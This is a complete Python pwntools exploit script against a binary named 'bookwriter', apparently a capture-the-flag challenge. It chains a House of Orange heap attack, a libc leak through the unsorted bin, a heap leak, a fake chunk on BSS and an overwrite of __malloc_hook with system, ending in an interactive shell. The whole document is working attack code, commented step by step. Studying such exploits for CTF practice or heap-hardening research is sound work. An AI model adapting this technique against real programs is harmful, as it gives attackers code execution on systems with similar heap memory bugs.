#!/usr/bin/env python2
# coding = utf-8
# Environment: Ubuntu 16.04

from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "linux", log_level = "debug")

def send_choice(choice):
    p.recvuntil('Your choice :')
    p.sendline(str(choice))

def input_author(data):
    p.recvuntil('Author :')
    p.send(data)

def add_data(size, data):
    send_choice(1)
    p.recvuntil('Size of page :')
    p.sendline(str(size))
    p.recvuntil('Content :')
    p.send(data)

def view_data(index):
    send_choice(2)
    p.recvuntil('Index of page :')
    p.sendline(str(index))
    p.recvuntil('Content :\n')

def edit_data(index, data):
    send_choice(3)
    p.recvuntil('Index of page :')
    p.sendline(str(index))
    p.recvuntil('Content:')
    p.send(data)

def info_read():
    send_choice(4)
    p.recvuntil('Author : ')
    buf = p.recvuntil('\n')
    p.recvuntil('Do you want to change the author ? (yes:1 / no:0) ')
    p.sendline("0")
    return buf

def info_write():
    send_choice(4)
    p.recvuntil('Do you want to change the author ? (yes:1 / no:0) ')
    p.sendline("1")


p = process('./bookwriter')
elf = ELF('./bookwriter')
# gdb.attach(p, '')

input_author('a' * 0x40)

# Step 1: Use `House of Orange` to get a free chunk in unsorted bin
add_data(0x18, 'a' * 0x18)                  # Create Chunk on page[0]
edit_data(0, 'a' * 0x18)                    # Update page_size[0] to a larger size
edit_data(0, '\x00' * 0x18 + '\xe1\x0f\x00')# Overwrite `mchunk_size` domain of Top Chunk to a smaller size, 
                                                # Data starting with `\x00` make `page_size[0] = 0` to enable an extra malloc
add_data(0x1fe1, 'a' * 20)                  # Create Large Chunk on page[1] to make ptmalloc recycle current small Top Chunk into Unsorted Bin

# Step 2: Unsorted Bin Libc Leak
add_data(0x40, '\x10')          # The chunk just entered UnsortedBin will be placed in LargeBin and split, then return, so page[2] cannot leak libc
                                    # Mustn't allocated all `0xfb8` size of UnsortedBin or No Backward Pointer from `main_arena` 
add_data(0x40, '\x10')          # Create Data[3] to leak `__malloc_hook` using `fd` domain of Unsorted Bin
view_data(3)                    # Address End with `\x10` is exactly `__malloc_hook`
libc_malloc_hook = u64(p.recv(6) + '\x00\x00')
libc = LibcSearcher('__malloc_hook', libc_malloc_hook)
libc_base = libc_malloc_hook - libc.dump('__malloc_hook')
system_libc = libc_base + libc.dump('system')
log.info('libc_base: ' + hex(libc_base))
log.info('system_libc: ' + hex(system_libc))

# Step 3: Leak Heap Address using printing `author_bss`
heap_addr = u64(info_read()[0x40:-1].ljust(8, '\x00'))
log.info('heap_addr: ' + hex(heap_addr))

# Step 4: Fake a chunk on author_bss
author_bss = 0x602060
top_chunk = libc_malloc_hook - 0x10 + 0x78
info_write()
input_author('/bin/sh\x00' + p64(0x111) + p64(top_chunk) * 2 + p64(0) * 4) # `fd` & `bk` point to Top Chunk to prevent validation error

# Step 5: Fill All the page[] term to overwrite page_size[0](page[8]) to control the heap
for i in range(5):
    add_data(0x40, 'a') # A large heap address is assigned to page_size[0] therefore enable a large size input on heap
"""
Extend UnsortedBin Double Linked List to data on BSS.
Mention that although the double linked list is corrupted, the program won't abort
    but will allocate chunk we faked on the BSS.
"""
edit_data(0, '\x00' * 0x240 + p64(0xdead) + p64(0x41) + p64(author_bss) * 2) # Exactly overwrite the free unsorted chunk
add_data(0x100, 'a' * 0x30 + p64(libc_malloc_hook - 8))
edit_data(0, p64(0) + p64(system_libc))         # Set page_size[0] to 0 to enable a next malloc invocation (getshell)
p.sendline("1")
p.recvuntil('Size of page :')
p.sendline(str(author_bss))

p.interactive()

